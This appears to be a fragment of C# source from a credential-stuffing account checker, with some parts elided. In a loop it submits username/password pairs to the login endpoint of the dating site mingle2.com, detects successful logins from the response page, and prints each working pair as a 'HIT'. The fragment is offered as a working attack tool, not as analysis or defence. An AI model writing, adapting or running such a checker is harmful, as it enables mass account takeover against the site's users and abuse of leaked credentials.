        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str = "utf8=%E2%9C%93&nexturl=&login=" + s[0] + "&password=" + s[1];
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              if (httpRequest.Post("https://m.mingle2.com/users/login?builder=SmartLabelFormBuilder", str, "application/x-www-form-urlencoded").ToString().Contains("href=\"/users/home\""))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - MINGLE.COM] " + s[0] + ":" + s[1], Color.Green);
